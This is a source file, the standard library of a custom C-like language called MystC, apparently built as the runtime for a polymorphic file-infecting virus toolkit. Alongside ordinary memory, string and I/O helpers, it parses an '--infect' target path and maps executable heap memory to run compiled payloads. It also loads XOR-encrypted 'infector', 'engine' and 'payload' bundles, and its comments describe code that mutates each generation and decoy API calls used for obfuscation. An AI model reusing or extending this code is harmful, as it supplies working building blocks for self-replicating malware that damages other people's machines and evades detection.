// stdlib.mc — MystC standard library
// Provides malloc/free/write/read/open/close/exit as platform-appropriate
// implementations. On Win32: MystC functions wrapping kernel32 APIs.
// On Linux: externs resolved by the ELF builder as syscall stubs.

// =============================================================================
// File Layout
// =============================================================================
//   1. Platform Wrappers
//   2. Strings & Memory
//   3. PRNG
//   4. I/O & Print
//   5. Dynamic Buffer
//   6. Bundle Runtime Handle
// =============================================================================

// =============================================================================
//
// Platform Wrappers Module
//
// Contains the following sections:
//   1. Win32 platform wrappers (kernel32 externs + malloc/free/read/write/open/close/exit)
//   2. Linux platform wrappers (__syscall wrappers + libc.so.6 externs)
//   3. Linux extern resolver (api table for load_and_run_bin)
//
// =============================================================================

#ifdef WIN32

extern "kernel32.dll" int GetProcessHeap();
extern "kernel32.dll" char* HeapAlloc(int heap, int flags, int size);
extern "kernel32.dll" int HeapFree(int heap, int flags, char* ptr);
extern "kernel32.dll" int GetStdHandle(int id);
extern "kernel32.dll" int WriteFile(int h, char* buf, int n, int* written, int ovl);
extern "kernel32.dll" int ReadFile(int h, char* buf, int n, int* bytesRead, int ovl);
extern "kernel32.dll" int CreateFileA(char* name, int access, int share, int sec, int disp, int flags, int templ);
extern "kernel32.dll" int CloseHandle(int h);
extern "kernel32.dll" void ExitProcess(int code);
extern "kernel32.dll" int GetTickCount();
extern "kernel32.dll" int GetFileSize(int handle, int* high);
extern "kernel32.dll" int VirtualAlloc(int addr, int size, int type, int protect);
extern "kernel32.dll" int VirtualFree(int addr, int size, int type);
extern "kernel32.dll" int LoadLibraryA(char* name);
extern "kernel32.dll" int GetProcAddress(int module, char* name);
extern "kernel32.dll" int GetModuleFileNameA(int hModule, char* buf, int size);

// File-API constants used by stdlib + integrators
int STD_OUTPUT_HANDLE = -11;
int STD_ERROR_HANDLE = -12;
int GENERIC_READ_K = -2147483648; // 0x80000000 (signed-min)
int GENERIC_WRITE_K = 0x40000000;
int FILE_SHARE_READ_K = 1;
int OPEN_EXISTING_K = 3;
int CREATE_ALWAYS_K = 2;
int INVALID_HANDLE_VALUE_K = -1;

// Harmless 0-arg APIs (for --x86-harmless-calls transform)
extern "kernel32.dll" int GetCurrentProcessId();
extern "kernel32.dll" char* GetCommandLineA();
extern "kernel32.dll" int GetLastError();
extern "kernel32.dll" int GetCurrentThreadId();
extern "kernel32.dll" int GetCurrentProcess();
extern "kernel32.dll" int IsDebuggerPresent();


void* malloc(int size) {
    return HeapAlloc(GetProcessHeap(), 0, size);
}

void free(void* ptr) {
    HeapFree(GetProcessHeap(), 0, ptr);
}

int write(int fd, char* buf, int n) {
    int written;
    int handle;
    if (fd == 1) {
        handle = GetStdHandle(-11);
    } else if (fd == 2) {
        handle = GetStdHandle(-12);
    } else {
        handle = fd;
    }
    WriteFile(handle, buf, n, &written, 0);
    return written;
}

int read(int fd, char* buf, int n) {
    int bytesRead;
    int handle;
    if (fd == 0) {
        handle = GetStdHandle(-10);
    } else {
        handle = fd;
    }
    ReadFile(handle, buf, n, &bytesRead, 0);
    return bytesRead;
}

int open(char* path, int mode) {
    if (mode == 1) {
        return CreateFileA(path, 0x40000000, 0, 0, 2, 0x80, 0);
    }
    return CreateFileA(path, -2147483648, 1, 0, 3, 0x80, 0);
}

int close(int fd) {
    return CloseHandle(fd);
}

void exit(int code) {
    ExitProcess(code);
}

#endif

#ifdef LINUX

// stdlib via INT 0x80 (the __syscall primitive). malloc/free use mmap2/munmap
// with a 4-byte size header before the returned pointer (8-byte aligned) so
// free() knows how much to unmap. Each call site emits its own load+INT 0x80
// sequence with PRNG-shuffled register order — every wrapper body is unique.

void* malloc(int size) {
    char* p;
    // PROT_READ|PROT_WRITE|PROT_EXEC = 7. The integrator/engine code path
    // compiles bytecode into malloc'd buffers and jumps into them, so the heap
    // must be executable.
    p = __syscall(192, 0, size + 8, 7, 34, -1);
    p[0] = size & 0xFF;
    p[1] = (size >> 8) & 0xFF;
    p[2] = (size >> 16) & 0xFF;
    p[3] = (size >> 24) & 0xFF;
    return &p[8];
}

void free(void* ptr) {
    char* hdr;
    int b0; int b1; int b2; int b3;
    int size;
    if (ptr == 0) { return; }
    hdr = ptr;
    hdr = &hdr[0 - 8];
    b0 = hdr[0] & 0xFF;
    b1 = hdr[1] & 0xFF;
    b2 = hdr[2] & 0xFF;
    b3 = hdr[3] & 0xFF;
    size = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
    __syscall(91, hdr, size + 8, 0, 0, 0);
}

int read(int fd, char* buf, int n) {
    return __syscall(3, fd, buf, n, 0, 0);
}

int write(int fd, char* buf, int n) {
    return __syscall(4, fd, buf, n, 0, 0);
}

int open(char* path, int mode) {
    // mode==0 → O_RDONLY; any non-zero value → O_WRONLY|O_CREAT|O_TRUNC
    // with permissions 0644. Callers pass either 0/1 or the raw flags
    // value (0x241 == 577) — both work.
    if (mode == 0) {
        return __syscall(5, path, 0, 0, 0, 0);
    }
    return __syscall(5, path, 0x241, 0x1A4, 0, 0);
}

int close(int fd) {
    return __syscall(6, fd, 0, 0, 0, 0);
}

void exit(int code) {
    __syscall(1, code, 0, 0, 0, 0);
}

// Harmless 0-arg APIs (for --x86-harmless-calls transform)
extern "libc.so.6" int getpid();
extern "libc.so.6" int getuid();
extern "libc.so.6" int getppid();
extern "libc.so.6" int getgid();
extern "libc.so.6" int geteuid();
extern "libc.so.6" int getegid();
extern "libc.so.6" int getpgrp();
extern "libc.so.6" int clock();

#endif

// When `load_and_run_bin` runs PIC code in RWX, the called code reaches host
// services through an API table of resolved function pointers. These thin
// wrappers give each host service a stable, addressable entry point — taking
// `&malloc` directly is unsafe because `malloc` is a polymorphed MystC
// function whose address shifts each generation. `clock` / `getpgrp` are
// approximated; some Linux toolchains don't expose them as plain libc exports.
#ifdef LINUX
void* api_malloc(int size)                  { return malloc(size); }
void  api_free(void* ptr)                   { free(ptr); }
int   api_write(int fd, char* buf, int n)   { return write(fd, buf, n); }
int   api_read(int fd, char* buf, int n)    { return read(fd, buf, n); }
int   api_open(char* path, int mode)        { return open(path, mode); }
int   api_close(int fd)                     { return close(fd); }
void  api_exit(int code)                    { exit(code); }
int   api_getpid()                          { return getpid(); }
int   api_getuid()                          { return getuid(); }
int   api_getppid()                         { return getppid(); }
int   api_getgid()                          { return getgid(); }
int   api_geteuid()                         { return geteuid(); }
int   api_getegid()                         { return getegid(); }
int   api_clock()                           { return getpid() ^ getppid(); }
int   api_getpgrp()                         { return getpid(); }

int resolve_linux_extern(char* dll_name, char* func_name) {
    if (str_eq(func_name, "malloc")  != 0) { return &api_malloc; }
    if (str_eq(func_name, "free")    != 0) { return &api_free; }
    if (str_eq(func_name, "write")   != 0) { return &api_write; }
    if (str_eq(func_name, "read")    != 0) { return &api_read; }
    if (str_eq(func_name, "open")    != 0) { return &api_open; }
    if (str_eq(func_name, "close")   != 0) { return &api_close; }
    if (str_eq(func_name, "exit")    != 0) { return &api_exit; }
    if (str_eq(func_name, "getpid")  != 0) { return &api_getpid; }
    if (str_eq(func_name, "getuid")  != 0) { return &api_getuid; }
    if (str_eq(func_name, "getppid") != 0) { return &api_getppid; }
    if (str_eq(func_name, "getgid")  != 0) { return &api_getgid; }
    if (str_eq(func_name, "geteuid") != 0) { return &api_geteuid; }
    if (str_eq(func_name, "getegid") != 0) { return &api_getegid; }
    if (str_eq(func_name, "clock")   != 0) { return &api_clock; }
    if (str_eq(func_name, "getpgrp") != 0) { return &api_getpgrp; }
    return 0;
}
#endif

// Locate `--infect <path>` on the program command line. Returns a malloc'd
// path string, or 0 if the flag is absent / has no argument. Win32 walks
// GetCommandLineA() honoring quoted argv[0]; Linux reads /proc/self/cmdline
// (NUL-separated argv).
#ifdef WIN32
char* parse_cmdline_infect() {
    char* cmdline; char* p;
    char arg_buf[260];
    int wp; int found; char* result;

    cmdline = GetCommandLineA();
    p = cmdline;
    found = 0;

    if (p[0] == 34) {
        p = p + 1;
        while (p[0] != 0 && p[0] != 34) { p = p + 1; }
        if (p[0] == 34) { p = p + 1; }
    } else {
        while (p[0] != 0 && p[0] != 32) { p = p + 1; }
    }

    while (p[0] != 0) {
        while (p[0] == 32) { p = p + 1; }
        if (p[0] == 0) { return 0; }
        wp = 0;
        if (p[0] == 34) {
            p = p + 1;
            while (p[0] != 0 && p[0] != 34 && wp < 259) {
                arg_buf[wp] = p[0]; wp = wp + 1; p = p + 1;
            }
            if (p[0] == 34) { p = p + 1; }
        } else {
            while (p[0] != 0 && p[0] != 32 && wp < 259) {
                arg_buf[wp] = p[0]; wp = wp + 1; p = p + 1;
            }
        }
        arg_buf[wp] = 0;
        if (found != 0) {
            result = malloc(wp + 1);
            str_copy(result, arg_buf);
            return result;
        }
        if (str_eq(arg_buf, "--infect") != 0) { found = 1; }
    }
    return 0;
}
#endif

#ifdef LINUX
char* parse_cmdline_infect() {
    char* buf;
    int fd; int total;
    char* p; char* end;
    int found; char* result; int len;

    buf = malloc(0x1000);
    fd = open("/proc/self/cmdline", 0);
    if (fd < 0) { free(buf); return 0; }
    total = read(fd, buf, 0x1000 - 1);
    close(fd);
    if (total <= 0) { free(buf); return 0; }
    buf[total] = 0;

    p = buf;
    end = buf + total;
    while (p < end && p[0] != 0) { p = p + 1; }
    p = p + 1;

    found = 0;
    while (p < end) {
        if (p[0] == 0) { p = p + 1; }
        if (p >= end) { free(buf); return 0; }
        if (found != 0) {
            len = str_len(p);
            result = malloc(len + 1);
            str_copy(result, p);
            free(buf);
            return result;
        }
        if (str_eq(p, "--infect") != 0) { found = 1; }
        while (p < end && p[0] != 0) { p = p + 1; }
        p = p + 1;
    }
    free(buf);
    return 0;
}
#endif


// =============================================================================
//
// Strings & Memory Module
//
// Contains the following sections:
//   1. String functions: str_len, str_eq
//   2. Memory primitives: mem_copy, mem_set
//   3. Byte primitives: read_i16, read_i32, write_i16, write_i32, align_up
//
// =============================================================================

int str_len(char* s) {
    int len;
    len = 0;
    while (s[len] != 0) {
        len = len + 1;
    }
    return len;
}

int str_eq(char* a, char* b) {
    int i;
    i = 0;
    while (a[i] != 0) {
        if (a[i] != b[i]) {
            return 0;
        }
        i = i + 1;
    }
    if (b[i] != 0) {
        return 0;
    }
    return 1;
}

void str_copy(char* dst, char* src) {
    int i;
    i = 0;
    while (src[i] != 0) {
        dst[i] = src[i];
        i = i + 1;
    }
    dst[i] = 0;
}

void mem_copy(char* dst, char* src, int n) {
    int i;
    i = 0;
    while (i < n) {
        dst[i] = src[i];
        i = i + 1;
    }
}

void mem_set(char* dst, int val, int n) {
    int i;
    i = 0;
    while (i < n) { dst[i] = val; i = i + 1; }
}

int read_i16(char* buf, int offset) {
    int lo;
    int hi;
    int val;
    lo = buf[offset] & 0xFF;
    hi = buf[offset + 1] & 0xFF;
    val = lo | (hi << 8);
    if (val >= 0x8000) { val = val - 0x10000; }
    return val;
}

int read_i32(char* buf, int offset) {
    int b0; int b1; int b2; int b3;
    b0 = buf[offset] & 0xFF;
    b1 = buf[offset + 1] & 0xFF;
    b2 = buf[offset + 2] & 0xFF;
    b3 = buf[offset + 3] & 0xFF;
    return b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
}

void write_i16(char* buf, int offset, int val) {
    buf[offset]     = val & 0xFF;
    buf[offset + 1] = (val >> 8) & 0xFF;
}

void write_i32(char* buf, int offset, int val) {
    buf[offset]     = val & 0xFF;
    buf[offset + 1] = (val >> 8) & 0xFF;
    buf[offset + 2] = (val >> 16) & 0xFF;
    buf[offset + 3] = (val >> 24) & 0xFF;
}

int align_up(int val, int align) {
    return (val + align - 1) & (0 - align);
}

// =============================================================================
//
// PRNG Module
//
// Contains:
//   1. Runtime seed source: runtime_seed
//   2. PRNG state and operations: prng_seed, prng_next, prng_range
//
// =============================================================================

#ifdef LINUX
// Read 4 bytes from /dev/urandom for an unpredictable seed; falls back to
// 0 if the device is unavailable (handled by runtime_seed below).
int read_urandom_seed() {
    int fd; int seed;
    char buf[4];
    seed = 0;
    fd = open("/dev/urandom", 0);
    if (fd >= 0) {
        read(fd, buf, 4);
        close(fd);
        seed = read_i32(buf, 0);
    }
    return seed;
}
#endif

int g_prng_state;

void prng_seed(int seed) {
    if (seed == 0) {
        g_prng_state = 12345;
    } else {
        g_prng_state = seed;
    }
}

int prng_next() {
    // LCG (Numerical Recipes): state = state * 1664525 + 1013904223
    g_prng_state = g_prng_state * 1664525 + 1013904223;
    if (g_prng_state < 0) {
        g_prng_state = g_prng_state & 0x7FFFFFFF;
    }
    return g_prng_state;
}

int prng_range(int max) {
    int val;
    if (max <= 0) {
        return 0;
    }
    val = prng_next();
    if (val < 0) {
        val = 0 - val;
    }
    return val % max;
}

int runtime_seed() {
#ifdef WIN32
    return GetTickCount() ^ GetCurrentProcessId();
#endif
#ifdef LINUX
    int s;
    s = read_urandom_seed();
    if (s != 0) { return s; }
    return getpid();
#endif
}

// =============================================================================
//
// I/O & Print Module
//
// Contains the following sections:
//   1. Standard streams: g_stdout, g_stderr, init_io
//   2. Stdout printers: print, print_int, print_hex
//   3. Stderr printers: print_err, print_int_err
//   4. File I/O: write_file
//
// =============================================================================

int g_stdout;
int g_stderr;

void init_io() {
#ifdef WIN32
    g_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    g_stderr = GetStdHandle(STD_ERROR_HANDLE);
#endif
#ifdef LINUX
    g_stdout = 1;
    g_stderr = 2;
#endif
}

void print(char* s) {
    int len;
    len = str_len(s);
    write(g_stdout, s, len);
}

void print_int(int val) {
    char buf[16];
    int pos;
    int neg;
    int d;

    pos = 15;
    buf[pos] = 0;
    neg = 0;

    if (val < 0) {
        neg = 1;
        val = 0 - val;
    }

    if (val == 0) {
        pos = pos - 1;
        buf[pos] = 48;
    } else {
        while (val > 0) {
            d = val % 10;
            pos = pos - 1;
            buf[pos] = 48 + d;
            val = val / 10;
        }
    }

    if (neg != 0) {
        pos = pos - 1;
        buf[pos] = 45;
    }

    write(g_stdout, &buf[pos], 15 - pos + 1);
}

void print_hex(int val) {
    char buf[16];
    int pos;
    int d;
    int i;
    pos = 15;
    buf[pos] = 0;

    i = 0;
    while (i < 8) {
        d = val & 0xF;
        pos = pos - 1;
        if (d < 10) {
            buf[pos] = 48 + d;
        } else {
            buf[pos] = 65 + d - 10;
        }
        val = val >> 4;
        i = i + 1;
    }

    write(g_stdout, &buf[pos], 8);
}

void print_err(char* s) {
    int len;
    len = str_len(s);
    write(g_stderr, s, len);
}

void print_int_err(int val) {
    char buf[16];
    int pos;
    int neg;
    int d;

    pos = 15;
    buf[pos] = 0;
    neg = 0;

    if (val < 0) {
        neg = 1;
        val = 0 - val;
    }

    if (val == 0) {
        pos = pos - 1;
        buf[pos] = 48;
    } else {
        while (val > 0) {
            d = val % 10;
            pos = pos - 1;
            buf[pos] = 48 + d;
            val = val / 10;
        }
    }

    if (neg != 0) {
        pos = pos - 1;
        buf[pos] = 45;
    }

    write(g_stderr, &buf[pos], 15 - pos + 1);
}

void write_file(char* path, char* data, int size) {
#ifdef WIN32
    int h;
    int written;
    h = CreateFileA(path, GENERIC_WRITE_K, 0, 0, CREATE_ALWAYS_K, 0, 0);
    if (h == INVALID_HANDLE_VALUE_K) {
        print("Cannot create: "); print(path); print("\n");
        return;
    }
    WriteFile(h, data, size, &written, 0);
    CloseHandle(h);
#endif
#ifdef LINUX
    int fd;
    fd = open(path, 1);
    if (fd < 0) {
        print("Cannot create: "); print(path); print("\n");
        return;
    }
    write(fd, data, size);
    close(fd);
#endif
}

// =============================================================================
//
// Dynamic Buffer Module
//
// =============================================================================

struct Buffer {
    char* data;
    int len;
    int cap;
};

struct Buffer* buf_new(int cap) {
    struct Buffer* b;
    b = malloc(16);
    b->data = malloc(cap);
    b->len = 0;
    b->cap = cap;
    return b;
}

void buf_grow(struct Buffer* b, int needed) {
    int new_cap;
    char* new_data;
    int i;

    if (b->len + needed <= b->cap) {
        return;
    }

    new_cap = b->cap * 2;
    if (new_cap < b->len + needed) {
        new_cap = b->len + needed + 256;
    }

    new_data = malloc(new_cap);
    i = 0;
    while (i < b->len) {
        new_data[i] = b->data[i];
        i = i + 1;
    }

    free(b->data);
    b->data = new_data;
    b->cap = new_cap;
}

void buf_write_u8(struct Buffer* b, int val) {
    buf_grow(b, 1);
    b->data[b->len] = val & 0xFF;
    b->len = b->len + 1;
}

void buf_write_u16(struct Buffer* b, int val) {
    buf_grow(b, 2);
    b->data[b->len] = val & 0xFF;
    b->data[b->len + 1] = (val >> 8) & 0xFF;
    b->len = b->len + 2;
}

void buf_write_u32(struct Buffer* b, int val) {
    buf_grow(b, 4);
    b->data[b->len] = val & 0xFF;
    b->data[b->len + 1] = (val >> 8) & 0xFF;
    b->data[b->len + 2] = (val >> 16) & 0xFF;
    b->data[b->len + 3] = (val >> 24) & 0xFF;
    b->len = b->len + 4;
}

void buf_patch_u32(struct Buffer* b, int offset, int val) {
    b->data[offset] = val & 0xFF;
    b->data[offset + 1] = (val >> 8) & 0xFF;
    b->data[offset + 2] = (val >> 16) & 0xFF;
    b->data[offset + 3] = (val >> 24) & 0xFF;
}

void buf_write_bytes(struct Buffer* b, char* data, int len) {
    int i;
    buf_grow(b, len);
    i = 0;
    while (i < len) {
        b->data[b->len] = data[i];
        b->len = b->len + 1;
        i = i + 1;
    }
}

// =============================================================================
//
// Bundle Runtime Handle Module
//
// Bundle data is described by a single BundleHeader (plaintext) + descriptor
// table emitted into .data by every writer. Consumers read components via
// bundle_open() + bundle_get(BC_*).
//
// On-disk layout:
//   struct BundleHeader        (32 bytes, plaintext)
//   struct Descriptor[n_descriptors]   (16 bytes each, plaintext)
//   <component bytes pointed at by base_addr — XOR-encrypted with key>
//
// =============================================================================

// Engine bundle pointer — patched with InfectBundle* address by the entry
// program before invoking the engine in RWX. Engines read it on entry.
int g_infect_bundle;
int g_infect_bundle_off;

int META_MAGIC   = 0x4154454D;   // "META" little-endian
int META_VERSION = 1;

int BC_CARRIER = 1;   // backend.mcb (recompiler / infector single carrier)
int BC_ENTRY   = 2;   // entry.mcb   (integrator)
int BC_ENGINE  = 3;   // engine.mcb  (integrator)
int BC_PAYLOAD = 4;   // payload.mcb (optional)
int BC_GENOME  = 5;   // genome bytes

struct BundleHeader {
    int   magic;            // META_MAGIC
    int   version;          // META_VERSION
    int   header_size;      // total size of header + descriptor table (= 32 + n_desc*16)
    int   n_descriptors;
    char* base_addr;        // absolute address of component bytes in .data
    int   payload_size;     // total bytes covered by `key` XOR
    int   key;              // XOR key for components (0 = plaintext / already decrypted)
    int   flags_reserved;   // reserved, must be 0
};

struct Descriptor {
    int kind;    // BC_*
    int offset;  // bytes from base_addr to component data
    int size;    // bytes
    int flags;   // bit 0 = encrypted (reserved; today all 1 or all 0)
};

// Set by the auto-embed writer (C backend) or the recompiler/integrator output
// path (MC backend) to the absolute address of the BundleHeader in .data.
// 0 if the binary wasn't built with bundle support.
struct BundleHeader* g_bundle_header;
int g_bundle_header_off;

void bundle_xor(char* data, int size, int key) {
    int i;
    int k0;
    int k1;
    int k2;
    int k3;
    k0 = key & 0xFF;
    k1 = (key >> 8) & 0xFF;
    k2 = (key >> 16) & 0xFF;
    k3 = (key >> 24) & 0xFF;
    i = 0;
    while (i < size) {
        if ((i & 3) == 0) { data[i] = data[i] ^ k0; }
        if ((i & 3) == 1) { data[i] = data[i] ^ k1; }
        if ((i & 3) == 2) { data[i] = data[i] ^ k2; }
        if ((i & 3) == 3) { data[i] = data[i] ^ k3; }
        i = i + 1;
    }
}

// =============================================================================
//
// Bundle header helpers
//
// Linear scan of the descriptor table that follows the 32-byte header. With
// n_descriptors ≤ 5 across all bundle layouts, an O(n) scan beats any
// indexing scheme.
//
// =============================================================================

struct Descriptor* bundle_find(struct BundleHeader* h, int kind) {
    int base;
    int d_addr;
    struct Descriptor* d;
    int i;
    if (h == 0) { return 0; }
    base = h;                         // struct* -> int (MystC pattern)
    i = 0;
    while (i < h->n_descriptors) {
        d_addr = base + 32 + i * 16;
        d = d_addr;                   // int -> struct*
        if (d->kind == kind) { return d; }
        i = i + 1;
    }
    return 0;
}

char* bundle_get(struct BundleHeader* h, int kind, int* out_sz) {
    struct Descriptor* d;
    d = bundle_find(h, kind);
    if (d == 0) { *out_sz = 0; return 0; }
    *out_sz = d->size;
    return h->base_addr + d->offset;
}

// Validate magic + version, decrypt component payload if key != 0. Returns 1
// on success, 0 on bad header. Safe to call multiple times — key is zeroed
// after the first successful decrypt.
int bundle_open(struct BundleHeader* h) {
    if (h == 0) { return 0; }
    if (h->magic != META_MAGIC) { return 0; }
    if (h->version != META_VERSION) { return 0; }
    if (h->key != 0) {
        bundle_xor(h->base_addr, h->payload_size, h->key);
        h->key = 0;
    }
    return 1;
}
